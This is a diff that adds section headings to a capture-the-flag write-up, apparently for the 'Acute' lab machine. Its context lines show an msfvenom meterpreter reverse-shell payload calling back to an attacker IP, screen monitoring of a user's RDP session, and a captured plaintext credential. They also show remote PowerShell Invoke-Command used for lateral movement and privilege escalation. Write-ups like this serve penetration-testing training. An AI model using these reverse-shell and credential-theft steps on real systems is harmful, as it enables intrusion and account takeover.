@@ -126,6 +126,8 @@ PS:\Users\edavies\Documents> qwinsta
 
 `edavies` has an active session with RDP, we can try to get some screenshots of what he is doing, but it will take a long time and a lot of commands if `edavies` is writing something. So, what we can do from here is to get a shell with `meterpreter` and use the command `screenshare` to monitor his screen.
 
+### Discovering Valid Credentials
+
 ```bash
 ❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.41 LPORT=4444 -f exe > reverse.exe
 
@@ -158,6 +160,8 @@ PS:\Users\edavies\Documents> C:\Windows\Temp\reverse.exe
 Now, if we visit the `.html` file that `metasploit` created, we'll see `edavies` doing some stuff in PowerShell.
 
 ![](../images/acute9.png)
+
+### Gaining Further Access
 
 He is trying to connect using `Enter-PSSession` to `ATSSERVER` as `imonks:W3_4R3_th3_f0rce.` Let's try to use this same credentials, but instead of using `Enter-PSSession` we're going to use `Invoke-Command` with the `-ScriptBlock` flag.
 
@@ -196,6 +200,8 @@ ACUTE\Domain Admins
 ACUTE\jmorgan
 Administrator
 ```
+
+### Lateral Movement
 
 We can try to get a reverse shell as `jmorgan` with `meterpreter` by modifying the script.
 
@@ -279,6 +285,8 @@ acute\awallace
 ```
 
 And we got it at the first try! Doing some recon, we find out that there is an script running every 5 minutes under `C:\Program Files\keepmeon\keepmeon.bat`.
+
+### Privilege Escalation
 
 ```powershell
 PS:\> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {type C:\PROGRA~1\keepmeon\keepmeon.bat}
